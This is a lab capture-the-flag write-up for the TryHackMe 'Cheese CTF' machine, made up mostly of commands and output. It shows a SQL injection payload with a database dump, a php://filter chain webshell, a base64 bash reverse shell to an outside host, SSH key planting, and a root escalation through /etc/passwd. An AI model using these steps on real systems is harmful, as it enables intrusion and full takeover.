## Cheese CTF

Machine IP: `10.128.190.167`

Room Description: Inspired by the great cheese talk of THM!

---

> First, I ran a port scan with rustscan, however there were too many ports open, so I limited it:

```shell
rustscan -a 10.128.190.167 -p 80,8080,22,139,445,3389 --ulimit=5000 -- -sCV        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.128.190.167:445
Open 10.128.190.167:3389
Open 10.128.190.167:80
Open 10.128.190.167:8080
Open 10.128.190.167:139
Open 10.128.190.167:22
```

---

## Content Discovery - Directory brute forcing with feroxbuster:

```shell
feroxbuster -u http://10.128.190.167 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

                                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.128.190.167/
 🚩  In-Scope Url          │ 10.128.190.167
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       57l       97w      705c http://10.128.190.167/style.css
200      GET       22l      152w    11038c http://10.128.190.167/images/cheese3.jpg
200      GET      101l      602w    47221c http://10.128.190.167/images/cheese1.jpg
200      GET       83l      491w    40571c http://10.128.190.167/images/cheese2.jpg
200      GET       28l       53w      834c http://10.128.190.167/login.php
200      GET       59l      121w     1759c http://10.128.190.167/
301      GET        9l       28w      317c http://10.128.190.167/images => http://10.128.190.167/images/
200      GET       59l      121w     1759c http://10.128.190.167/index.html
[####################] - 12s     4762/4762    0s      found:8       errors:0      
[####################] - 12s     4751/4751    401/s   http://10.128.190.167/ 
[####################] - 0s      4751/4751    51086/s http://10.128.190.167/images/ => Directory listing (add --scan-dir-listings to scan)
```


<img width="3456" height="2096" alt="Screenshot From 2026-07-07 20-01-31" src="https://github.com/user-attachments/assets/cec8ac07-8ce4-4ed3-8fa3-48e30cac3d95" />

<img width="3456" height="2096" alt="Screenshot From 2026-07-07 20-01-40" src="https://github.com/user-attachments/assets/93ad1c6c-d840-4c72-91ae-9fb92206d8ad" />


---

> I found a login portal so I decided using default credentials, but did not work. Moreover, we can't guess usernames looking at the error message. That's why I tried using SQL-Injection, and got a hit.

```shell
sqlmap -r burp --batch --dbs
...

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4177 FROM (SELECT(SLEEP(5)))eels) AND 'WnwN'='WnwN&password=admin
---
[11:33:32] [INFO] the back-end DBMS is MySQL
[11:33:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:33:37] [INFO] fetching database names
[11:33:37] [INFO] fetching number of databases
[11:33:37] [INFO] retrieved: 
[11:33:47] [INFO] adjusting time delay to 1 second due to good response times
2
[11:33:48] [INFO] retrieved: information_schema
[11:35:01] [INFO] retrieved: users
available databases [2]:
[*] information_schema
[*] users

```

Found tables: users, information_schema. Knowing this:

```shell
sqlmap -r burp --batch -D users --dump
...

Database: users
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```

Found the user: `comte`, however, hash cannot be cracked. So I tried a login bypass on this user. Standard `'--` method did not work, so I tried: 

<img width="3456" height="1804" alt="Screenshot From 2026-07-07 19-56-47" src="https://github.com/user-attachments/assets/7858c521-2519-4d48-91f2-4892948e915d" />

> And bypassed the login without password.



<img width="3456" height="1830" alt="Screenshot From 2026-07-07 20-03-14" src="https://github.com/user-attachments/assets/a28424ae-b9bb-40e7-9409-953cf03cef16" />

> Then found a messages section:

<img width="3456" height="1817" alt="Screenshot From 2026-07-07 20-03-51" src="https://github.com/user-attachments/assets/d3e7e04b-1ef5-4cbd-9460-3a2e6503bcc3" />

It used 'php://filter', so I tried reading `/etc/passwd`, and got the contents, meaning it was vulnerable to LFI. Then, I used a tool to generate a webshell:
[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

```shell
──(root㉿kali)-[~]
└─# python3 exploit-generator.py --chain '<?=`$_GET[0]`?>'      
[+] The following gadget chain will generate the following code : <?=`$_GET[0]`?> (base64 value: PD89YCRfR0VUWzBdYD8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

> Then I copied the payload into URL, and appended `0=id&` after `secret_script.php?`:

<img width="3456" height="1843" alt="Screenshot From 2026-07-07 20-24-57" src="https://github.com/user-attachments/assets/0ebaa701-8ada-48e4-b2bc-ce48e4bf0a1f" />


---

## Reverse Shell

> I encoded the reverse shell payload to avoid URL special character conflicts:

```
┌──(root㉿kali)-[~]
└─# echo "/bin/bash -i >& /dev/tcp/192.168.152.35/4444 0>&1" | base64       
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=
                                                                                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=" | base64 -d | bash
```

And pasted it to '0?', and got a callback from the server.

---

## Inital Foothold and user.txt

```shell
┌──(root㉿kali)-[~]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
connect to [192.168.152.35] from (UNKNOWN) [10.128.190.167] 32950
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-128-190-167:/var/www/html$ ls
ls
adminpanel.css
images
index.html
login.css
login.php
messages.html
orders.html
secret-script.php
style.css
supersecretadminpanel.html
supersecretmessageforadmin
users.html
```

As I expected, I found the credentials for `comte` user inside the .php file:

```shell
www-data@ip-10-128-190-167:/var/www/html$ cat login.php
cat login.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        
    </div>
    <?php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

```
But these creds did not work anywhere.

---

## Searching for writable files:

```shell
www-data@ip-10-128-190-167:/var/www/html$ find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
<e 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
/home/comte/.ssh/authorized_keys
/etc/systemd/system/exploit.timer
www-data@ip-10-128-190-167:/var/www/html$ 
```

Two files appear. So I generated my own ssh key, and put it in /.ssh/authorized_keys.

```shell
┌──(root㉿kali)-[~]
└─# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase for "/root/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:... root@kali
The key's randomart image is:
...

```
```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCHcvmOuJym+Xs5QVu06SykzEiGLMxkMUHn9lsP2vm..." > /home/comte/.ssh/authorized_keys

┌──(root㉿kali)-[~]
└─# chmod 600 /root/.ssh/id_rsa.pub

┌──(root㉿kali)-[~]
└─# ssh -i /root/.ssh/id_rsa comte@10.128.190.167 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 07 Jul 2026 05:03:17 PM UTC

  System load:  0.0                Processes:             124
  Usage of /:   30.6% of 18.53GB   Users logged in:       0
  Memory usage: 13%                IPv4 address for ens5: 10.128.190.167
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

8 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@ip-10-128-190-167:~$ 

```

## User.txt

```bash
comte@ip-10-128-190-167:~$ ls
snap  user.txt
comte@ip-10-128-190-167:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
comte@ip-10-128-190-167:~$ 
```

## Privilege Escalation & root.txt

> exploit.timer is writable:

```shell
comte@ip-10-128-190-167:~$ ls -l /opt/xxd
ls: cannot access '/opt/xxd': No such file or directory
comte@ip-10-128-190-167:~$ ls -l /opt/xxd
ls: cannot access '/opt/xxd': No such file or directory
comte@ip-10-128-190-167:~$ nano /etc/systemd/system/exploit.
comte@ip-10-128-190-167:~$ nano /etc/systemd/system/exploit.timer
comte@ip-10-128-190-167:~$ sudo /bin/systemctl daemon-reload
comte@ip-10-128-190-167:~$ sudo /bin/systemctl enable exploit.timer
comte@ip-10-128-190-167:~$ sudo /bin/systemctl start exploit.timer
comte@ip-10-128-190-167:~$ sudo /bin/systemctl restart exploit.timerls -l /opt/xxd
[sudo] password for comte: 
comte@ip-10-128-190-167:~$ ls -la /opt
total 28
drwxr-xr-x  2 root root  4096 Jul  7 17:10 .
drwxr-xr-x 19 root root  4096 Jul  7 15:17 ..
-rwsr-sr-x  1 root root 18712 Jul  7 17:10 xxd
comte@ip-10-128-190-167:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=5s

[Install]
WantedBy=timers.target
comte@ip-10-128-190-167:~$ 
```

Now that xxd has SUID bit, we can exploit it to elevate our privileges. Either we can read from /root/root.txt, or create a new user with root privileges.

> FILE READ

```bash
comte@ip-10-128-190-167:~$ /opt/xxd "/root/root.txt" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca7548609...9b11e5e0167c}
comte@ip-10-128-190-167:~$ 
```

> FILE WRITE

```shell
comte@ip-10-128-190-167:~$ (cat /etc/passwd; echo "murcy:$(openssl passwd -1 "password123"):0:0:root:/root:/bin/bash") | xxd | /opt/xxd -r - /etc/passwd
comte@ip-10-128-190-167:~$ su murcy
Password: 
root@ip-10-128-190-167:/home/comte# cat /root/root.txt
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca754860948...b7b0a929b11e5e0167c}
root@ip-10-128-190-167:/home/comte# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-128-190-167:/home/comte# 
```

And finishing the CTF.

---

You may check [this](https://jaxafed.github.io/posts/tryhackme-cheese_ctf/) for a more detailed writeup.
